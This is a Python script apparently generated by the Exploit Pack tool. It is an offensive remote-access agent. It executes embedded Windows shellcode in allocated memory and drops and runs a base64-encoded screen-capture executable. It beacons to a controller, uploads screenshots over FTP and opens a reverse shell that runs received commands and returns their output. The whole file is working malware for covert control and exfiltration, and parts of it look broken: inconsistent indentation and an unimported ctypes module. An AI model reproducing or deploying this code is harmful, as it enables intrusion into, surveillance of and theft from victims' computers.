# Shell Script created using Exploit Pack
# http://www.exploitpack.com - support@exploitpack.com
import socket,subprocess,errno,time,os,signal,sys, os
import base64
import time
import urllib2

class Agent:
    def __init__(self, target, port):
        self.hostname = target
        self.port = int(port)

    def shellcode(self):
        print "[*] Executing Shellcode"
        shellcode = bytearray("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54\x24\x20\x57\xFF\xD0")
	      ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
	      buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
	      ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
	      ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
	      ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

    def run_worker(self):
        self.shellcode()

        while True:
            try:
                print "[?] Agent -> Exploit Pack"
                self.poke()
            except Exception,exc:
                  print "[!] Timeout"
                  time.sleep(5)
            else:
                print "[?] Agent <- Exploit Pack"
        else:
            raise

    def poke(self):
        whoami = ([(checkip.connect(('8.8.8.8', 80)), checkip.getsockname()[0], checkip.close()) for checkip in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((self.hostname, self.port))
        s.sendall(whoami)
        data = s.recv(1024)
        split = data.split(":")

        if whoami == split[0]:
            print "[*] Connecting back to Exploit Pack"
            sterminal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sterminal.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sterminal.connect((hostname, int(split[1])))
            s.close()
            with open('ftp.txt', 'wb') as ftpFile:
                ftpFile.write("open " +hostname + " 2121"+"\n")
                ftpFile.write(username+"\n")
                ftpFile.write("Binary"+"\n")
                ftpFile.write("put screen.png"+"\n")
                ftpFile.write("bye"+"\n")
                max_tries = 0
            while True:
                try:
                    while max_tries < 20:
                        time.sleep(1)
                        max_tries+=1
                        os.system("cmd.exe /c start /min ftp.exe -s:ftp.txt")
                        response = urllib2.urlopen("http://"+hostname+":8000/agent")
                        response.read()
                    res = subprocess.check_output(sterminal.recv(1024), shell=True)
                    sterminal.sendall(res)
                except Exception as exc:
                    sterminal.sendall("[!] Screenshot sent!\n")
hostname = "127.0.1.1"
username = "anonymous"
port = "1234"
screenshot = "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UFkAQml0Qmx0AENyZWF0ZUNvbXBhdGlibGVCaXRtYXAAQ3JlYXRlQ29tcGF0aWJsZURDAERlbGV0ZURDAERlbGV0ZU9iamVjdABTZWxlY3RPYmplY3QAR2V0RGVza3RvcFdpbmRvdwBHZXRXaW5kb3dEQwBSZWxlYXNlREMAR2V0V2luZG93UmVjdABHZXRGb3JlZ3JvdW5kV2luZG93AFNldFByb2Nlc3NEUElBd2FyZQBsZWZ0AHRvcAByaWdodABib3R0b20AaGFuZGxlAGZpbGVuYW1lAGhPYmplY3QAblhEZXN0AG5ZRGVzdABuV2lkdGgAbkhlaWdodABoT2JqZWN0U291cmNlAG5YU3JjAG5ZU3JjAGR3Um9wAGhEQwBoV25kAHJlY3QAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHNjcmVlbnNob3QAQml0bWFwAEZyb21IYml0bWFwAFNhdmUARW52aXJvbm1lbnQAR2V0Q29tbWFuZExpbmVBcmdzAEV4aXQAU3RyaW5nAFRvTG93ZXIARXF1YWxzAFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljAERpY3Rpb25hcnlgMgBnZXRfQm1wAEFkZABnZXRfRW1mAGdldF9FeGlmAGdldF9KcGVnAGdldF9HaWYAZ2V0X1BuZwBnZXRfVGlmZgBnZXRfV21mAExhc3RJbmRleE9mAGdldF9MZW5ndGgAU3Vic3RyaW5nAENvbnNvbGUAV3JpdGVMaW5lAGdldF9JdGVtAENvbmNhdABUb1N0cmluZwBFeGNlcHRpb24ATWljcm9zb2Z0LlZpc3VhbEJhc2ljAEludGVyYWN0aW9uAEFwcEFjdGl2YXRlAC5jY3RvcgBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMARGxsSW1wb3J0QXR0cmlidXRlAGdkaTMyLmRsbAB1c2VyMzIuZGxsAFN0cnVjdExheW91dEF0dHJpYnV0ZQBMYXlvdXRLaW5kAAAAAAAFLwBoAAALLwBoAGUAbABwAAAHYgBtAHAAAAdlAG0AZgAACWUAeABpAGYAAAdqAHAAZwAACWoAcABlAGcAAAdnAGkAZgAAB3AAbgBnAAAJdABpAGYAZgAAB3cAbQBmAAABAEFJAG4AdgBhAGwAaQBkACAAZgBpAGwAZQAgAG4AYQBtAGUAIAAtACAAbgBvACAAZQB4AHQAZQBuAHMAaQBvAG4AATdQAHIAbwBiAGEAYgBsAHkAIAB3AHIAbwBuAGcAIABmAGkAbABlACAAZgBvAHIAbQBhAHQAOgAAgIMgAGMAYQBwAHQAdQByAGUAcwAgAHQAaABlACAAcwBjAHIAZQBlAG4AIABvAHIAIAB0AGgAZQAgAGEAYwB0AGkAdgBlACAAdwBpAG4AZABvAHcAIABhAG4AZAAgAHMAYQB2AGUAcwAgAGkAdAAgAHQAbwAgAGEAIABmAGkAbABlAC4AAA1VAHMAYQBnAGUAOgAAAyAAADEgAGYAaQBsAGUAbgBhAG0AZQAgACAAWwBXAGkAbgBkAG8AdwBUAGkAdABsAGUAXQAAdWYAaQBsAGUAbgBhAG0AZQAgAC0AIAB0AGgAZQAgAGYAaQBsAGUAIAB3AGgAZQByAGUAIAB0AGgAZQAgAHMAYwByAGUAZQBuACAAYwBhAHAAdAB1AHIAZQAgAHcAaQBsAGwAIABiAGUAIABzAGEAdgBlAGQAAYCXIAAgACAAIAAgAGEAbABsAG8AdwBlAGQAIABmAGkAbABlACAAZQB4AHQAZQBuAHMAaQBvAG4AcwAgAGEAcgBlACAALQAgAEIAbQBwACwARQBtAGYALABFAHgAaQBmACwARwBpAGYALABJAGMAbwBuACwASgBwAGUAZwAsAFAAbgBnACwAVABpAGYAZgAsAFcAbQBmAC4AAYCRVwBpAG4AZABvAHcAVABpAHQAbABlACAALQAgAGkAbgBzAHQAZQBhAGQAIABvAGYAIABjAGEAcAB0AHUAcgBlACAAdwBoAG8AbABlACAAcwBjAHIAZQBlAG4AIAB5AG8AdQAgAGMAYQBuACAAcABvAGkAbgB0ACAAdABvACAAYQAgAHcAaQBuAGQAbwB3ACAAAW8gACAAIAAgACAAdwBpAHQAaAAgAGEAIAB0AGkAdABsAGUAIAB3AGgAaQBjAGgAIAB3AGkAbABsACAAcAB1AHQAIABvAG4AIABmAG8AYwB1AHMAIABhAG4AZAAgAGMAYQBwAHQAdQB0AGUAZAAuAACAgSAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAADAAAACA3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
fileData = base64.standard_b64decode(screenshot.encode('UTF-8'))
with open('screenshot.exe', 'wb') as screenFile:
    screenFile.write(fileData)
os.system("cmd.exe /c start /min screenshot.exe screen.png")
new = Agent(hostname, port)
new.run_worker()

